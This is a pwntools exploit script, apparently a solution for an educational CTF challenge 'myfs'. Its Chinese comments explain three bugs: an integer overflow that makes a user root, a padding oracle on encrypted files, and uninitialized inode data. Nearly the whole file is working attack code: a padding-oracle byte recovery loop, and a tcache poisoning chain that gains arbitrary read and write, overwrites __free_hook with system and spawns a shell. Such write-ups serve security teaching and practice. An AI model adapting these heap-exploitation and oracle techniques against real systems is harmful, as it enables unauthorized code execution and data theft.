#!/usr/bin/python3

from pwn import *
import sys
import string

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

if len(sys.argv) != 3:
    exit(1)

"""
##### **myfs** #####
flag1: integer overflow
雖然看似 uid 有擋不能 == 0x100，但是 mu_cnt 只在 0 ~ 255，因此不會有 256 的情況。
所以當你建立夠多使用者，就能讓你的 uid 變成 0，因此可以存取到 root 的檔案。

const uint32_t mu_max_user_cnt = 0x100;
static uint8_t mu_cnt = 0;
MyUser *__new_mu(const char *username, const char *password, MyFile *rootfs_mf)
{
    if (mu_cnt == mu_max_user_cnt)
        return NULL;
}

---

flag2: padding oracle
請看 my_encrypt() 與 my_decrypt() 的加解密過程

leak iv:
ssize_t write_mf(MyUser *ms, MyFile *mf)
{
    ...
    if (mf_is_enc(mf))
        return hexdump(mf->data.ino->content, AES_BLOCK_SIZE);
    ...
}

overwrite iv:
int read_mf(MyUser *mu, MyFile *mf)
{
    ...
    if (mf_is_enc(mf))
        return read(STDIN_FILENO, mf->data.ino->content, mf->size);
    ...
}

---

flag3: unintialized data
發現後可以控制 tcache chunk 的 fd，因此可以指定拿到某個 heap address (需要撞 1/16)，
再來控制接下來拿到的 iNode struct 跟某塊 content 做重疊，就能透過 mf_read() / mf_write()
來 leak heap address 與 overwrite content pointer，用 aar 讀 openssl api 使用時殘留的 libc address，
aaw 寫 __free_hook 即可。

MyFile *_new_normfile(uint8_t uid, char *fn)
{
    MyFile *mf = __new_mf();
    mf->uid = uid;
    mf->fn = strdup(fn);
    mf->data.ino = (iNode *) malloc(sizeof(iNode));
    // 這邊應該要多一個: mf->data.ino->content = NULL;
    mf->data.ino->refcnt = 1;
    return mf;
}

---

幾本上 flag2 最明顯，因為沒事不會設計成可以篡改加密的檔案，反正寫法有夠怪；
解掉 flag1 也能解 flag2，因為直接用 dec 解開就好；
解掉 flag3 也能解 flag1,2，因為有 aar 跟 aaw，改 uid + leak key 即可
"""

r = None

def create_user(u, p):
    r.sendlineafter('> ', f"useradd {u} {p}")

def delete_user(u, p):
    r.sendlineafter('> ', f"userdel {u} {p}")

def login(u, p):
    r.sendlineafter('> ', f"login {u} {p}")

def create_normfile(fn):
    r.sendlineafter('> ', f"create normfile {fn}")

def create_dir(fn):
    r.sendlineafter('> ', f"create dir {fn}")

def delete_file(fn):
    r.sendlineafter('> ', f"rm {fn}")

def enc_file(fn):
    r.sendlineafter('> ', f"enc {fn}")

def dec_file(fn):
    r.sendlineafter('> ', f"dec {fn}")

def enter_dir(fn):
    r.sendlineafter('> ', f"cd {fn}")

def _info(fn):
    r.sendlineafter('> ', f"info {fn}")

def read_file(fn, data):
    r.sendlineafter('> ', f"read {fn}")
    r.send(data)
    sleep(0.5)

def write_file(fn):
    r.sendlineafter('> ', f"write {fn}")

def set_prot_file(fn, prot):
    r.sendlineafter('> ', f"set {fn} {prot}")

def unset_prot_file(fn, prot):
    r.sendlineafter('> ', f"unset {fn} {prot}")

def slss_file(fn):
    r.sendlineafter('> ', f"slss {fn}")

def slsd_file(fn):
    r.sendlineafter('> ', f"slsd {fn}")

def hlss_file(fn):
    r.sendlineafter('> ', f"hlss {fn}")

def hlsd_file(fn):
    r.sendlineafter('> ', f"hlsd {fn}")

def verify_hash(prefix, answer, difficulty):
    h = hashlib.sha256()
    h.update((prefix + answer).encode())
    bits = ''.join(bin(i)[2:].zfill(8) for i in h.digest())
    return bits.startswith('0' * difficulty)

def solve_pow(r):
    r.recvuntil('sha256(')
    prefix = r.recvuntil(' + ???)', drop = True).decode()

    i = 0
    while not verify_hash(prefix, str(i), 20):
        i += 1

    print(i)
    r.sendlineafter('POW answer:', str(i))

wl = string.ascii_letters + string.digits + '\n'
if sys.argv[2] == 'flag3':
    for _ in range(0x40):
        try:
            if sys.argv[1] == 'remote':
                r = remote('edu-ctf.zoolab.org', 30213)
                solve_pow(r)
            else:
                r = process('./myfs')

            for i in range(0xe):
                create_normfile(str(i))

            create_normfile('large_file')
            read_file('large_file', 0x408 * b'\x00')

            for i in range(0xe):
                delete_file(str(i))

            create_normfile('owo')
            # gdb.attach(r)
            read_file('owo', b'\x50\x3b')

            create_normfile('qaq')
            read_file('qaq', 0x18 * b'\x00')

            write_file('large_file') # overlap with inode of qaq
            r.recv(0x10)
            heap = u64(r.recv(6).ljust(8, b'\x00')) - 0x18a0
            info(f"heap: {hex(heap)}")

            def aar(addr):
                data = (p64(0)*2 + p64(addr)).ljust(0x408, b'\x00')
                read_file('large_file', data)
                write_file('qaq')

            def aaw(addr, content):
                data = (p64(0)*2 + p64(addr)).ljust(0x408, b'\x00')
                read_file('large_file', data)
                read_file('qaq', content.ljust(0x18, b'\x00'))

            aar(heap + 0x890)
            libc = u64(r.recv(8)) - 0x2d0e00 - 0x1f2000
            __free_hook = libc + 0x1eeb28
            _system = libc + 0x55410
            info(f"libc: {hex(libc)}")
            aaw(heap + 0x10, p64(0x0000000100040000))
            aaw(__free_hook - 8, b'/bin/sh\x00' + p64(_system))

            for i in range(0xf):
                create_normfile(str(i))

            for i in range(0xf):
                delete_file(str(i))

            delete_file('qaq')
            r.interactive()
            exit(1)
        except Exception as e:
            print(e)
elif sys.argv[2] == 'flag2':
    flag = b'\n\x07\x07\x07\x07\x07\x07\x07'
    i = len(flag) + 1
    while i < 0x10:
        if sys.argv[1] == 'remote':
            r = remote('edu-ctf.zoolab.org', 30213)
            solve_pow(r)
        else:
            r = process('./myfs')
        
        write_file('test_file_L1')
        cipher = r.recvuntil('/> ', drop=True)
        cipher = bytes.fromhex(cipher.decode())
        
        tmp_cipher = cipher[:-i] + b'\x00'
        for j in range(-i+1, 0, 1):
            tmp_cipher += bytes([ cipher[j] ^ flag[j] ^ i ])

        r.sendline("info test_file_L1")
        try:
            for bt in range(0x100):
                if bt == cipher[-i]:
                    continue
                if -i + 1 == 0:
                    try_cipher = tmp_cipher[:-i] + bytes([bt])
                else:
                    try_cipher = tmp_cipher[:-i] + bytes([bt]) + tmp_cipher[-i+1:]
                
                read_file('test_file_L1', try_cipher)
                dec_file('test_file_L1')
                oracle = r.recv(3)

                if oracle != b'[-]':
                    xd = bytes([bt ^ i ^ cipher[-i]])
                    if xd.decode() in wl:
                        flag = xd + flag
                        print("[flag]: ", flag)
                        i += 1
                    break
        except:
            pass
        r.close()
        
    r.interactive()
elif sys.argv[2] == 'flag1':
    if sys.argv[1] == 'remote':
        r = remote('edu-ctf.zoolab.org', 30213)
        solve_pow(r)
    else:
        r = process('./myfs')
    
    for i in range(0xfd):
        create_user(str(i), str(i))

    create_user('fuck', 'fuck')
    login('fuck', 'fuck')
    enter_dir('test_dir_L1')
    write_file('test_file2_L2')
    
    r.interactive()
else:
    exit(1)
